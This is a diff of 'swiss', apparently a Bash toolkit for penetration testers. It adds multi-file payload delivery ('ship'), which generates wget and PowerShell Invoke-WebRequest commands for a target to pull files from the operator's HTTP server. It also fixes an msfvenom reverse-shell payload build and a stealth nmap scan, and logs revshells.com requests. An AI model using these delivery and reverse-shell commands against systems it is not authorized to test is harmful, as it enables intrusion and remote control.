@@ -16,7 +16,6 @@ load_private_scripts
 # swiss -h
 function swiss() {
     _banner() {
-        # TODO: fix padding for version string
         swiss_logger info ".--------------------------------------------."
         swiss_logger info "|                                            |"
         swiss_logger info "|                                            |"
@@ -26,7 +25,7 @@ function swiss() {
         swiss_logger info "|  ____/ /__ |/ |/ / __/ /  ____/ /____/ /   |"
         swiss_logger info "|  /____/ ____/|__/  /___/  /____/ /____/    |"
         swiss_logger info "|                                            |"
-        swiss_logger info "|  by @dextermallo v$_swiss_app_version                    |"
+        swiss_logger info "|  by @dextermallo v1.4.1                    |"
         swiss_logger info "'--------------------------------------------'"
     }
 
@@ -277,7 +276,7 @@ function nmap_default() {
         stealth)
             mkdir -p $saved_file_path/stealth
             swiss_logger info "[i] Start stealth nmap. Saved to $saved_file_path/stealth/stealth"
-            sudo nmap -sS -p0-65535 -oN $saved_file_path/stealth/stealth
+            sudo nmap -sS -p0-65535 $ip -oN $saved_file_path/stealth/stealth
             ;;
         *)
             swiss_logger error "[e] Invalid mode '$mode'. Valid modes are: fast, tcp, udp, udp-all."
@@ -398,6 +397,11 @@ function svc() {
             i
             $HOME/.local/bin/wsgidav --host=0.0.0.0 --port=${@} --auth=anonymous --root .
             ;;
+        python-venv)
+            extension_fn_banner
+            python3 -m venv .venv
+            source .venv/bin/activate
+            ;;
         *)
             swiss_logger error "[e] Invalid service '$service'. Valid service: docker; ftp; http; smb; ssh; bloodhound; wsgi"
             return 1
@@ -416,12 +420,12 @@ function svc() {
 # Category: [ func:rce, func:pe, target:windows, target:linux ]
 function ship() {
     local type="linux"
-    local filepath
     local autoHostHttp=true
+    local filepaths=()
+    local all_cmds=""
 
     _helper() {
-        swiss_logger error "[e] Filepath is required."
-        swiss_logger info "Usage: ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>"
+        swiss_logger info "Usage: ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>..."
         return 1
     }
 
@@ -432,31 +436,51 @@ function ship() {
                 shift 2
                 ;;
             -a|--auto-host-http)
-                $autoHostHttp="$2"
+                autoHostHttp="$2"
                 shift 2
                 ;;
+            -h|--help)
+                _helper
+                return 0
+                ;;
             *)
-                filepath="$1"
+                filepaths+=("$1")
                 shift
                 ;;
         esac
     done
 
-    if [[ -z "$filepath" ]]; then
+    if [[ ${#filepaths[@]} -eq 0 ]]; then
+        swiss_logger error "[e] At least one filepath is required."
         _helper
-    fi
-
-    if [[ ! -f "$filepath" ]]; then
-        swiss_logger error "[e] File '$filepath' does not exist."
         return 1
     fi
 
-    local filename=$(basename "$filepath")
+    local all_cmds=""
 
-    cp "$filepath" "./$filename" && swiss_logger info "[i] File '$filename' copied to current directory."
+    for filepath in "${filepaths[@]}"; do
+        if [[ ! -f "$filepath" ]]; then
+            swiss_logger error "[e] File '$filepath' does not exist."
+            return 1
+        fi
 
+        local filename=$(basename "$filepath")
+        cp "$filepath" "./$filename" && swiss_logger info "[i] File '$filename' copied to current directory."
 
-    autoHost() {
+        local cmd
+        if [[ "$type" == "linux" ]]; then
+            cmd="wget $(get_default_network_interface_ip)/$filename"
+        elif [[ "$type" == "windows" ]]; then
+            cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(get_default_network_interface_ip)/$filename' -OutFile C:/ProgramData/$filename\""
+        else
+            log error "[e] Unknown type '$type'."
+            return 1
+        fi
+
+        all_cmds+="$cmd"$'\n'
+    done
+
+    _autoHost() {
         if [[ "$autoHostHttp" = true ]]; then
             svc http
         else
@@ -464,26 +488,14 @@ function ship() {
         fi
     }
 
-    if [[ "$type" == "linux" ]]; then
-        local cmd="wget $(get_default_network_interface_ip)/$filename"
-        swiss_logger info "[i] Linux type selected. wget command ready."
-        swiss_logger info "[i] $cmd"
-        echo -n $cmd | xclip -selection clipboard
+    echo -n "$all_cmds" | xclip -selection clipboard
+    swiss_logger info "[i] All commands copied to clipboard."
+    _autoHost
 
-        autoHost
-
-    elif [[ "$type" == "windows" ]]; then
-        local cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(get_default_network_interface_ip)/$filename' -OutFile C:/ProgramData/$filename\""
-        swiss_logger info "[i] Windows type selected. wget command ready."
-        swiss_logger info "[i] $cmd"
-
-        echo -n $cmd | xclip -selection clipboard
-
-        autoHost
-    else
-        log error "[e] Unknown type '$type'."
-    fi
+    # TODO: remove the copied files automatically with global conf
 }
+
+
 
 # Description:
 #   One-liner to start a reverse shell listener,
@@ -561,7 +573,7 @@ function windows_rev() {
             ;;
         x64)
             if [[ $generate_stage = true ]]; then
-                msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86-stage.exe
+                msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64-stage.exe
             fi
 
             if [[ $generate_stageless = true ]]; then
@@ -1167,6 +1179,8 @@ cheatsheet() {
 # TODO: Doc
 # TODO: built-in encode
 # TODO: env default port
+# TODO: list options for shell type
+# TODO: fix revshell issue on 42 (Powershell base64)
 # Category: [ func:shortcut, func:rce, func:memorize ]
 function rev_shell() {
     swiss_logger info "[i] Enter IP (Default: $(get_default_network_interface_ip)): \c"
@@ -1220,6 +1234,8 @@ function rev_shell() {
 
     local ENCODED_SHELL=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$SHELL_TYPE'''))")
     local URL="https://www.revshells.com/${ENCODED_MODE}?ip=${IP}&port=${PORT}&shell=${ENCODED_SHELL}"
+
+    swiss_logger debug "[d] Request=$URL"
     local HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${URL}")
 
     if [[ "$HTTP_STATUS" -eq 200 ]]; then
@@ -1456,7 +1472,7 @@ function memory() {
 
         local temp_note="$mktemp.md"
         {
-            echo "# $filename"
+            echo "# Utils: $filename"
             echo "## Description: "
             echo "## Path: $relative_path"
             echo "## Shortcut: $shortcut_name"
@@ -1472,9 +1488,9 @@ function memory() {
     }
 
     _view_note() {
-        if grep -q "^# $filename$" "$notes_path"; then
+        if grep -q "^# Utils: $filename$" "$notes_path"; then
             swiss_logger debug "[d] Note found for $filename:"
-            output=$(sed -n "/^# $filename$/,/^# /p" "$notes_path" | sed '$d')
+            output=$(sed -n "/^# Utils: $filename$/,/^# Utils: /{ /^# Utils: $filename$/b; /^# Utils: /q; p }" "$notes_path")
             if [ $_swiss_cat_use_pygmentize = true ]; then
                 swiss_logger debug "[d] Use pygementize"
                 local temp_md="$mktemp.md"
@@ -1501,8 +1517,8 @@ function memory() {
                 swiss_logger debug "[d] Directory detected. Listing files with descriptions:"
                 tree -C "$absolute_path" -L 1 | while read -r line; do
                     filename=$(echo "$line" | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g' | awk '{print $NF}')
-                    if grep -q "^# $filename$" "$notes_path"; then
-                        local description=$(grep -A 1 "^# $filename$" "$notes_path" | grep '^## Description' | cut -d':' -f2-)
+                    if grep -q "^# Utils: $filename$" "$notes_path"; then
+                        local description=$(grep -A 1 "^# Utils: $filename$" "$notes_path" | grep '^## Description' | cut -d':' -f2-)
                         echo -e "$line \033[33m$description\033[0m"
                     else
                         echo "$line"
@@ -1595,6 +1611,26 @@ function shortcut() {
 
     echo "$name=\"$file_path\"" >> "$dest"
     swiss_logger info "[i] Variable $name for $file_path has been added to $type."
+}
+
+# TODO: Doc
+# Category: [ func:check ]
+function check_extension() {
+    local alias_file="$swiss_extension"
+    while IFS= read -r line; do
+        [[ -z "$line" || ! "$line" =~ "=" || "$line" =~ ^# ]] && continue
+        local var_name="${line%%=*}"
+        local file_path="${line#*=}"
+        [[ ! "$var_name" =~ ^[a-zA-Z_][a-zA-Z0-9_]*$ ]] && continue
+        file_path="${file_path%\"}"
+        file_path="${file_path#\"}"
+
+        eval expanded_file_path="$file_path"
+
+        if [[ ! -e "$expanded_file_path" ]]; then
+            swiss_logger warn "[w] $var_name is invalid or does not exist: $expanded_file_path"
+        fi
+    done < "$alias_file"
 }
 
 spawn_session_in_workspace
